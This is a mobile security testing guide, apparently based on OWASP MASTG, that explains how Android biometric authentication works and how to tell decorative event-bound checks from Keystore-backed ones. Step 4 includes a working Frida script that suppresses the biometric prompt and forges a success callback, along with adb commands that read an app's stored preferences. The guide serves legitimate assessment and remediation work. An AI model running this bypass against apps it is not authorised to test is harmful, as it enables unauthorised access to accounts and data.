---
title: "Android Biometric Authentication (MASTG-KNOW-0001)"
date: 2026-09-02
subcategory: auth
summary: "How Android biometric auth actually works, why event-bound implementations are trivially bypassed, and how to test for Keystore-backed flows."
refs: [MASTG-KNOW-0001, MASVS-AUTH-2, CWE-287]
tags: [android, biometrics, keystore, frida, masvs-auth]
---

## What it is

Android exposes biometric authentication (fingerprint, face, iris) to applications through the `androidx.biometric` Jetpack library, which wraps the platform APIs and provides a consistent surface back to Android 6.0 (API 23). The three components you will encounter in almost every app:

| Component | Purpose |
|---|---|
| `BiometricPrompt` | Renders the system authentication dialog and returns success/failure/error callbacks |
| `BiometricManager` | Queries whether a given authenticator class is available and enrolled (`canAuthenticate(int)`) |
| `FingerprintManager` | Legacy fingerprint-only API, deprecated in Android 9 (API 28) — see MASTG-KNOW-0002 |

Android classifies biometric sensors by **strength**, not by modality, based on measured spoof and imposter acceptance rates. Apps select what they will accept via `BiometricManager.Authenticators`:

- `BIOMETRIC_STRONG` — Class 3 sensor. The only class that may be used to gate Keystore keys.
- `BIOMETRIC_WEAK` — Class 2 sensor. Cannot unlock `CryptoObject`-bound keys.
- `DEVICE_CREDENTIAL` — the device PIN, pattern or password.

These can be combined bitwise, e.g. `BIOMETRIC_STRONG | DEVICE_CREDENTIAL`. Supported combinations vary by API level; notably, `DEVICE_CREDENTIAL` with a `CryptoObject` only works on Android 11 (API 30) and above.

## The distinction that matters: event-bound vs. crypto-bound

This is the single most important thing to determine during an assessment, and it decides whether the control is real or decorative.

**Event-bound authentication.** The app calls `BiometricPrompt.authenticate(promptInfo)` with no `CryptoObject`. The system dialog appears, the user authenticates, and the app receives an `onAuthenticationSucceeded()` callback. The app then decides, in its own code, to unlock the screen or release a token. Nothing cryptographic is tied to the result — the callback is just a boolean-ish signal in the app's own process. An attacker who controls the runtime simply calls the success callback directly, or patches the branch.

**Crypto-bound (Keystore-backed) authentication.** The app generates a key in the Android Keystore with `setUserAuthenticationRequired(true)`, wraps a `Cipher`, `Signature` or `Mac` in a `BiometricPrompt.CryptoObject`, and passes it to `authenticate()`. The Keystore will not permit the key operation until the user has authenticated to the required class of authenticator. The authentication result is enforced by the Keystore (and, where available, by the TEE or Secure Element), not by app logic. Bypassing the UI gains nothing, because the attacker still cannot make the key perform the operation.

The security property you are testing is therefore: **is something that the attacker actually needs gated behind the key, or does the app merely observe a callback?**

## Keystore authorisation parameters

When a key is created with `KeyGenParameterSpec.Builder`, the following flags determine the strength of the binding:

- `setUserAuthenticationRequired(true)` — the key cannot be used until the user authenticates. Without this, the biometric prompt is decorative regardless of everything else.
- `setUserAuthenticationParameters(timeout, type)` — current API (API 30+). A `timeout` of `0` means **auth-per-operation**: every single use of the key requires a fresh authentication. Any value above zero opens a time window in which the key can be used without re-authenticating, which an attacker with code execution can ride.
- `setUserAuthenticationValidityDurationSeconds(int)` — the deprecated predecessor of the above; seeing it in a modern app usually indicates a time-window flow.
- `setInvalidatedByBiometricEnrollment(boolean)` — defaults to `true` for biometric-only keys, meaning enrolling a new fingerprint destroys the key. If the app sets this to `false`, an attacker who can enrol their own biometric on an unlocked device inherits the ability to use the key. Setting it to `false` needs a documented justification.
- `setInvalidatedByBiometricEnrollment` does not apply when `DEVICE_CREDENTIAL` is in the allowed set, which is one reason mixing the two weakens the control.

## How to test

### 1. Establish what the prompt is protecting

Decompile and locate the entry points:

```bash
jadx -d out/ target.apk
grep -rn "BiometricPrompt\|BiometricManager\|setUserAuthenticationRequired\|CryptoObject" out/sources/
```

Trace every `authenticate(` call and record whether the first argument is a `CryptoObject` or the call is the single-argument `authenticate(promptInfo)` form. A `null` or absent `CryptoObject` is the finding.

### 2. Check the authenticator class requested

```bash
grep -rn "setAllowedAuthenticators\|BIOMETRIC_WEAK\|BIOMETRIC_STRONG\|DEVICE_CREDENTIAL" out/sources/
```

`BIOMETRIC_WEAK` on a flow that protects sensitive data is a finding on its own — Class 2 sensors have materially higher spoof acceptance and cannot back Keystore keys. Also check `canAuthenticate()` handling: apps that silently fall back to "no auth" when `BIOMETRIC_ERROR_NONE_ENROLLED` is returned have an availability-driven bypass.

### 3. Verify the key material and its authorisations

Where the key is generated, confirm the parameters listed above. Then verify at runtime whether the key is hardware-backed:

```java
SecretKeyFactory factory = SecretKeyFactory.getInstance(key.getAlgorithm(), "AndroidKeyStore");
KeyInfo info = (KeyInfo) factory.getKeySpec(key, KeyInfo.class);
info.isInsideSecureHardware();
info.isUserAuthenticationRequirementEnforcedBySecureHardware();
```

A key that is software-backed, or whose authentication requirement is not enforced by secure hardware, degrades to something an attacker with root can extract or replay.

### 4. Attempt the runtime bypass

The standard test is to try the event-bound bypass and observe whether it succeeds. objection has a built-in bypass only for iOS (`ios ui biometrics_bypass`); on Android, use it for reconnaissance and do the bypass with Frida:

```bash
objection -g com.target.app explore
# then, inside objection:
android hooking watch class android.hardware.biometrics.BiometricPrompt
```

The Frida script below suppresses the prompt and fires `onAuthenticationSucceeded` directly. It hooks the platform `android.hardware.biometrics.BiometricPrompt`, which the androidx library delegates to on Android 9 (API 28) and later, and it passes the app's own `CryptoObject` back unauthenticated so you can see whether the Keystore refuses to use it:

```javascript
Java.perform(function () {
  const BP = Java.use('android.hardware.biometrics.BiometricPrompt');
  const Result = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');
  const Runnable = Java.use('java.lang.Runnable');
  let n = 0;

  function makeResult(crypto) {
    try { return Result.$new(crypto, 2); }    // API 30+: (CryptoObject, AUTHENTICATION_RESULT_TYPE_BIOMETRIC)
    catch (e) { return Result.$new(crypto); } // API 28-29: (CryptoObject)
  }
  function fireSuccess(executor, callback, crypto) {
    const Fire = Java.registerClass({
      name: 'gt.FireSuccess' + (n++),
      implements: [Runnable],
      methods: { run: function () { callback.onAuthenticationSucceeded(makeResult(crypto)); } }
    });
    executor.execute(Fire.$new());
  }

  BP.authenticate.overload('android.os.CancellationSignal', 'java.util.concurrent.Executor',
      'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback')
    .implementation = function (cancel, executor, callback) {
      console.log('[!] authenticate() without CryptoObject: prompt suppressed');
      fireSuccess(executor, callback, null);
    };
  BP.authenticate.overload('android.hardware.biometrics.BiometricPrompt$CryptoObject',
      'android.os.CancellationSignal', 'java.util.concurrent.Executor',
      'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback')
    .implementation = function (crypto, cancel, executor, callback) {
      console.log('[*] authenticate() with CryptoObject: passing it back unauthenticated');
      fireSuccess(executor, callback, crypto);
    };
});
```

```bash
frida -U -f com.target.app -l biometric-bypass.js
```

A longer version that also logs what `Cipher.doFinal` and `Signature.sign` do afterwards is in our [MASWE-0020 note](/mobile/maswe-0020-local-authentication-bypass/).

**Interpretation of the result is the whole test.** If the app proceeds to its protected screen, the biometric check was event-bound and is bypassed. If the app proceeds but then fails to decrypt — throwing `IllegalBlockSizeException` with a `KeyStoreException: Key user not authenticated` cause — the key binding is real and the control held. Record which of the two happened; that distinction is the finding.

### 5. Check what happens after authentication

Even a correct crypto-bound flow fails if the decrypted secret is then cached insecurely. Follow the plaintext: is the token written to `SharedPreferences`, held in a static field for the process lifetime, or re-encrypted under a non-auth-bound key? Pull the app data directory and look:

```bash
adb shell run-as com.target.app ls -laR /data/data/com.target.app/
adb shell run-as com.target.app cat /data/data/com.target.app/shared_prefs/*.xml
```

## Impact

An event-bound biometric implementation gives no security benefit against an attacker who has code execution in the app process — which includes any malicious app on a rooted device, any user of a stolen unlocked device with a debug-enabled build, and any attacker who repackages the APK. Where the biometric prompt is the only control over a stored session token, payment authorisation, or local data decryption, the practical impact is full account or data access.

Severity depends on what sits behind the prompt. A biometric gate over a read-only balance view is Low; a biometric gate over transaction signing or a long-lived refresh token is High. Where the app also disables `setInvalidatedByBiometricEnrollment`, an attacker with brief physical access to an unlocked device gains persistent access, which raises it further.

## Remediation

- Use `BiometricPrompt` with a `CryptoObject` and a Keystore key created with `setUserAuthenticationRequired(true)`.
- Use `setUserAuthenticationParameters(0, KeyProperties.AUTH_BIOMETRIC_STRONG)` so authentication is required per operation.
- Restrict to `BIOMETRIC_STRONG` for anything protecting credentials or transactions; do not silently accept `BIOMETRIC_WEAK`.
- Leave `setInvalidatedByBiometricEnrollment(true)` unless there is a documented reason.
- Never store the value released by authentication in plaintext; keep it encrypted under the auth-bound key and decrypt per use.
- Treat biometrics as a local convenience over a server-authenticated session, not as a replacement for server-side authentication.

## References

- OWASP MASTG — [MASTG-KNOW-0001: Biometric Authentication](https://mas.owasp.org/MASTG/knowledge/android/MASVS-AUTH/MASTG-KNOW-0001/) (CC BY-SA 4.0)
- [Android Developers — Biometric authentication](https://developer.android.com/identity/sign-in/biometric-auth)
- [AOSP — Measuring biometric unlock security](https://source.android.com/docs/security/features/biometric/measure)
- [Android Keystore system](https://developer.android.com/privacy-and-security/keystore)
